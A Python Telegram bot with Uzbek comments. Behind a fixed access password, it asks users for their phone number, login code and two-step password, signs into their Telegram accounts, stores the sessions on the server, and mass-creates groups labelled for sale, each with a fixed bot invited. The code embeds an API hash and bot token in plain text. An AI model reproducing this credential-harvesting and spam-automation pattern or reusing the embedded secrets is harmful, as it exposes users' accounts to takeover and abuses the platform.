import logging
import asyncio
import os
from pathlib import Path
from aiohttp import web

from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup, Update,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ConversationHandler, MessageHandler, filters, ContextTypes
)
from telethon import TelegramClient, errors
from telethon.tl.functions.channels import CreateChannelRequest, InviteToChannelRequest

# 📂 sessions papkasini yaratamiz
Path("sessions").mkdir(exist_ok=True)

# ——— TELEGRAM API ma’lumotlari ———
api_id = 25351311
api_hash = "7b854af9996797aa9ca67b42f1cd5cbe"
bot_token = os.environ.get("BOT_TOKEN", "8350150569:AAEfax1UQn1AnpWrDdwFo0c7zCzDklkcbJk")

# 🔑 Kirish paroli
ACCESS_PASSWORD = "dnx"

# 🎯 Avtomatik qo‘shiladigan bot
TARGET_BOT = "@oxang_bot"

# ——— LOGGER ———
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ——— Holatlar ———
ASK_PASSWORD, SELECT_MODE, PHONE, CODE, PASSWORD, GROUP_RANGE = range(6)

# ——— Session va avtorizatsiya boshqaruvlari ———
sessions = {}
authorized_users = set()

# ——— START ———
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in authorized_users:
        return await show_menu(update)
    await update.effective_message.reply_text("🔒 Kirish parolini kiriting:")
    return ASK_PASSWORD

# ——— Parol tekshirish ———
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.strip() != ACCESS_PASSWORD:
        await update.effective_message.reply_text("❌ Noto‘g‘ri parol.")
        return ConversationHandler.END
    authorized_users.add(update.effective_user.id)
    return await show_menu(update)

# ——— Menyu chiqarish ———
async def show_menu(update: Update):
    keyboard = [[
        InlineKeyboardButton("Guruh ochish", callback_data='create_group'),
        InlineKeyboardButton("Guruhni topshirish", callback_data='transfer_group')
    ]]
    await update.effective_message.reply_text(
        "Rejimni tanlang⚙️",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return SELECT_MODE

# ——— Rejim tanlash ———
async def mode_chosen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['mode'] = query.data
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await query.message.reply_text("📞 Telefon raqamingizni yuboring:", reply_markup=keyboard)
    return PHONE

# ——— Telefon qabul qilish ———
async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.contact.phone_number if update.message.contact else update.message.text.strip()
    if not phone.startswith('+') or not phone[1:].isdigit():
        await update.effective_message.reply_text("Telefon raqam + bilan boshlanishi va raqam bo‘lishi kerak.")
        return PHONE

    context.user_data['phone'] = phone
    client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
    sessions[update.effective_user.id] = client

    await client.connect()
    if not await client.is_user_authorized():
        try:
            await client.send_code_request(phone)
            await update.effective_message.reply_text("📩 Kod yuborildi, kiriting:")
            return CODE
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Xato: {e}")
            return ConversationHandler.END
    await update.effective_message.reply_text("✅ Akkount allaqachon ulangan.")
    return await after_login(update, context)

# ——— Kod qabul qilish ———
async def code_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = sessions.get(update.effective_user.id)
    phone = context.user_data.get('phone')
    try:
        await client.sign_in(phone, update.message.text.strip())
    except errors.SessionPasswordNeededError:
        await update.effective_message.reply_text("🔑 2 bosqichli parolni kiriting:")
        return PASSWORD
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Xato: {e}")
        return ConversationHandler.END
    return await after_login(update, context)

# ——— 2FA parol ———
async def password_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = sessions.get(update.effective_user.id)
    try:
        await client.sign_in(password=update.message.text.strip())
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Xato: {e}")
        return ConversationHandler.END
    return await after_login(update, context)

# ——— Login tugagach ———
async def after_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text("📊 Nechta guruh yaratilsin? (masalan 1-5)")
    return GROUP_RANGE

# ——— Guruhlar soni qabul qilish (progress bilan) ———
async def group_range_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        start, end = map(int, update.message.text.strip().split('-'))
        if start <= 0 or end < start:
            raise ValueError
    except ValueError:
        await update.effective_message.reply_text("❌ Noto‘g‘ri format. Masalan: 1-5")
        return GROUP_RANGE

    client = sessions.get(update.effective_user.id)
    phone = context.user_data.get("phone")
    total = end - start + 1

    # Progress xabarini yuboramiz
    progress_msg = await update.effective_message.reply_text(
        f"📢 ({phone}) uchun guruh ochish boshlandi\n"
        f"Jami: {total} ta guruh\n"
        f"Ochilgan: 0/{total}, Xatolik: 0"
    )

    # Orqa fon vazifasi
    asyncio.create_task(background_group_creator(
        user_id=update.effective_user.id,
        client=client,
        start=start, end=end,
        mode=context.user_data.get('mode'),
        context=context,
        progress_msg=progress_msg,
        total=total,
        phone=phone
    ))
    return ConversationHandler.END

# ——— Guruh yaratish jarayoni (progress update bilan) ———
async def background_group_creator(user_id, client, start, end, mode, context, progress_msg, total, phone):
    created = 0
    failed = 0

    for i in range(start, end + 1):
        try:
            result = await client(CreateChannelRequest(
                title=f"Guruh #{i}", about="Guruh sotiladi", megagroup=True
            ))
            channel = result.chats[0]

            try:
                await client(InviteToChannelRequest(channel, [TARGET_BOT]))
            except Exception:
                pass  # bot qo‘shilmasa ham davom etadi

            created += 1

        except Exception:
            failed += 1

        # Progressni yangilash
        try:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=progress_msg.message_id,
                text=(
                    f"📢 ({phone}) uchun guruh ochish\n"
                    f"Jami: {total} ta guruh\n"
                    f"Ochilgan: {created}/{total}, Xatolik: {failed}"
                )
            )
        except Exception:
            pass

        await asyncio.sleep(2)

    # Yakuniy natija
    await context.bot.edit_message_text(
        chat_id=user_id,
        message_id=progress_msg.message_id,
        text=(
            f"✅ ({phone}) uchun guruh yaratish tugadi!\n"
            f"Ochilgan: {created}, Xatolik: {failed}, Jami: {total}"
        )
    )

    await client.disconnect()
    sessions.pop(user_id, None)

# ——— Bekor qilish ———
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text("❌ Bekor qilindi.")
    if (client := sessions.pop(update.effective_user.id, None)):
        await client.disconnect()
    return ConversationHandler.END

# 🌐 WEB SERVER
async def handle(_):
    return web.Response(text="Bot alive!")

async def start_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"🌐 Web-server {port} portda ishga tushdi.")
    while True:
        await asyncio.sleep(3600)

# 🤖 BOT
async def run_bot():
    application = Application.builder().token(bot_token).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
            SELECT_MODE: [CallbackQueryHandler(mode_chosen)],
            PHONE: [MessageHandler(filters.TEXT | filters.CONTACT, phone_received)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, code_received)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_received)],
            GROUP_RANGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, group_range_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    application.add_handler(conv_handler)

    logger.info("🤖 Bot ishga tushdi.")
    await application.run_polling()

# ASOSIY
async def main():
    await asyncio.gather(
        start_webserver(),
        run_bot()
    )

if __name__ == "__main__":
    asyncio.run(main())
